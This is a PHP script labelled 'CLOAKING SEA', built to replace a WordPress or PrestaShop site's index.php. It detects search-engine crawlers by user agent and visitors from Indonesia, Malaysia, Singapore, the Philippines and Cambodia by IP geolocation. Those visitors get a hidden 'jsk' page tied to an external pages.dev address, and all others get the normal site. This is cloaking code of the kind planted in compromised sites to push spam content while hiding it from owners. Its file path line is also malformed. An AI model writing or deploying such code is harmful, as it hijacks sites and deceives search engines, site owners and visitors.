<?php
// ==========================
// CLOAKING SEA - BOT + ID/MY/SG/PH/KH
// ==========================
// Put this at your front controller (index.php) or vhost root.
// Adjust $jskPath, $cacheTtl, and $logFile as needed.

declare(strict_types=1);

$jskPath    = __DIR__ . 'https://punten-neng.pages.dev/accsoft.lk/';
$maxSize    = 1024 * 1024;                      // 1 MB safe limit (adjustable)
$cacheTtl   = 3600;                             // cache geo per-ip (seconds)
$logFile    = sys_get_temp_dir() . '/cloak_debug.log';
$apiTimeout = 1.2;                              // seconds per geo API

// safe server helpers
function safeServer(string $k): string {
    return strtolower($_SERVER[$k] ?? '');
}
$userAgent = safeServer('HTTP_USER_AGENT');
$clientIp   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
$clientIp   = explode(',', $clientIp)[0];
$clientIp   = trim($clientIp);

// --- Bot UA list (lowercase) ---
$botUaList = [
    'googlebot','adsbot-google','googleweblight','google-site-verification','google-inspectiontool',
    'bingbot','msnbot','yandexbot','baiduspider','duckduckbot','slurp','duckduckgo',
    'facebot','facebookexternalhit'
];

// countries allowed (SEA)
$allowedCountries = ['ID','MY','SG','PH','KH'];

// --- Logging helper (lightweight) ---
function cloak_log(string $m) {
    global $logFile;
    $t = date('Y-m-d H:i:s');
    @file_put_contents($logFile, "[$t] $m\n", FILE_APPEND | LOCK_EX);
}

// --- UA bot quick check ---
function uaIsBot(string $ua, array $list): bool {
    $ua = strtolower($ua);
    foreach ($list as $b) {
        if (strpos($ua, $b) !== false) return true;
    }
    return false;
}

// --- Cache helpers (per-ip) ---
function cachePath(string $ip): string {
    return sys_get_temp_dir() . '/cloak_geo_' . md5($ip) . '.cache';
}
function cacheRead(string $ip, int $ttl) {
    $p = cachePath($ip);
    if (!file_exists($p)) return null;
    if (time() - filemtime($p) > $ttl) { @unlink($p); return null; }
    return @file_get_contents($p);
}
function cacheWrite(string $ip, string $val) {
    $p = cachePath($ip);
    @file_put_contents($p, $val, LOCK_EX);
}

// --- Geo check via cache or API (returns country code or null) ---
function geoCountry(string $ip, int $ttl, float $timeout = 1.2): ?string {
    // quick cache
    $cached = cacheRead($ip, $ttl);
    if ($cached !== null) return $cached ?: null;

    // endpoints (prefer lightweight country-only endpoints)
    $urls = [
        "https://ipapi.co/{$ip}/country/",     // returns "ID" etc
        "https://ipinfo.io/{$ip}/country"     // returns "ID" etc
    ];
    $ctx_opts = ['http' => ['method' => 'GET', 'timeout' => $timeout, 'header' => "User-Agent: geo-check/1.0\r\nAccept: text/plain\r\n"]];
    foreach ($urls as $u) {
        $ctx = stream_context_create($ctx_opts);
        $res = @file_get_contents($u, false, $ctx);
        if ($res !== false) {
            $c = strtoupper(trim($res));
            if (preg_match('/^[A-Z]{2}$/', $c)) {
                cacheWrite($ip, $c);
                return $c;
            }
        }
    }

    // fallback: attempt JSON endpoints (slightly slower)
    $jsonUrls = [
        "https://ipapi.co/{$ip}/json/",
        "https://ipinfo.io/{$ip}/json"
    ];
    $ctx_opts2 = ['http' => ['method' => 'GET', 'timeout' => $timeout, 'header' => "User-Agent: geo-check/1.0\r\nAccept: application/json\r\n"]];
    foreach ($jsonUrls as $u) {
        $ctx = stream_context_create($ctx_opts2);
        $raw = @file_get_contents($u, false, $ctx);
        if ($raw !== false) {
            $data = json_decode($raw, true);
            if (is_array($data)) {
                $c = strtoupper($data['country'] ?? $data['country_code'] ?? $data['countryCode'] ?? '');
                if (preg_match('/^[A-Z]{2}$/', $c)) {
                    cacheWrite($ip, $c);
                    return $c;
                }
            }
        }
    }

    // mark as none (cache empty string short)
    cacheWrite($ip, '');
    return null;
}

// --- Decision flow ---
$isBotUa = uaIsBot($userAgent, $botUaList);

if ($isBotUa) {
    cloak_log("UA matched bot: IP={$clientIp}; UA={$userAgent}");
    // serve jsk for bots (fast path)
    if (is_file($jskPath) && is_readable($jskPath)) {
        $size = filesize($jskPath);
        if ($size > $maxSize) {
            header('HTTP/1.1 200 OK');
            header('Content-Type: text/html; charset=UTF-8');
            echo "<!doctype html><html><head><meta charset='utf-8'><title>JSK</title></head><body><h1>JSK</h1><p>Konten tersedia.</p></body></html>";
            exit;
        }
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        readfile($jskPath);
        exit;
    } else {
        header('HTTP/1.1 404 Not Found');
        echo 'jsk.html not found';
        exit;
    }
}

// not bot UA => do geo check (cached)
$country = geoCountry($clientIp, $cacheTtl, $apiTimeout);
cloak_log("Geo lookup: IP={$clientIp}; country=" . ($country ?? 'NULL'));

// if country in allowed SEA list -> serve jsk
if ($country !== null && in_array($country, $allowedCountries, true)) {
    if (is_file($jskPath) && is_readable($jskPath)) {
        $size = filesize($jskPath);
        if ($size > $maxSize) {
            header('HTTP/1.1 200 OK');
            header('Content-Type: text/html; charset=UTF-8');
            echo "<!doctype html><html><head><meta charset='utf-8'><title>JSK</title></head><body><h1>JSK</h1><p>Konten tersedia.</p></body></html>";
            exit;
        }
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        readfile($jskPath);
        exit;
    } else {
        header('HTTP/1.1 404 Not Found');
        echo 'jsk.html not found';
        exit;
    }
}

// fallback => serve default app (WordPress / PrestaShop)
cloak_log("Fallback to app: IP={$clientIp}; UA={$userAgent}");
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
